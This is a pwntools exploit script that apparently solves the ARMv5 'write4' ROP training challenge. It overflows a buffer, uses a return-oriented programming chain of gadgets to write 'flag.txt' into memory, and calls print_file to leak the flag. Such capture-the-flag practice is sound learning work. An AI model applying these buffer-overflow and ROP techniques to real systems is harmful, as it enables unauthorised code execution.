from pwn import *

data = 0x00021024 # rw-
print_file = 0x000104b0 # plt
pop_r3_r4 = 0x000105f0 # pop {r3, r4, pc}
str_r3_r4 = 0x000105ec # str r3, [r4] ; pop {r3, r4, pc}
pop_r0 = 0x000105f4 # pop {r0, pc}
file = b"flag.txt"

payload = b"".join([
    b"A"*(32+4),
    p32(pop_r3_r4),
    file[:4],
    p32(data),
    p32(str_r3_r4),
    file[4:],
    p32(data+4),
    p32(str_r3_r4),
    b"B"*8,
    p32(pop_r0),
    p32(data),
    p32(print_file),
])

#p = process(["qemu-arm", "-g", "1234", "write4_armv5"])
p = process("./write4_armv5")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"you!\n")
flag = p.recv()
print(f"Flag : {flag}")
